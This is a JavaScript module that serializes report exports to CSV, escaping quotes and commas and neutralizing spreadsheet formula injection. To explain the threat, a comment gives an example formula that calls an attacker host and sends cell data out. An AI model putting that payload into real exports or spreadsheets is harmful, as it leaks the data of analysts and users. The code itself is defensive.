// Shared CSV serialization for report exports.
//
// Two things every cell has to survive:
//
//  1. RFC 4180 quoting — commas, quotes and newlines inside a value.
//  2. Spreadsheet formula injection. Excel, LibreOffice and Google Sheets
//     evaluate any cell whose text begins with = + - @ (or a leading tab /
//     carriage return before one of those). PRISM exports fields that users
//     type — ticket titles, contact names, notes — so a value like
//     =HYPERLINK("http://attacker/?d="&A1,"Click") becomes a live formula in
//     the analyst's spreadsheet, exfiltrating the row it sits next to. The
//     value is prefixed with a single quote, which spreadsheets treat as
//     "this is text" and do not display as part of the content.
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

function csvCell(value) {
  let s = value === null || value === undefined ? '' : String(value);

  if (FORMULA_TRIGGERS.test(s)) {
    s = `'${s}`;
  }

  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

// Rows are arrays of already-ordered values. Each cell is escaped exactly
// once — the previous implementation mapped csvCell over the row and then
// again over the assembled line, so any value containing a comma came out
// wrapped in a second layer of quotes ("""a,b""" instead of "a,b").
function toCsv(headerLabels, rows) {
  const lines = [headerLabels.map(csvCell).join(',')];
  rows.forEach((row) => lines.push(row.map(csvCell).join(',')));
  return lines.join('\r\n');
}

module.exports = { csvCell, toCsv };
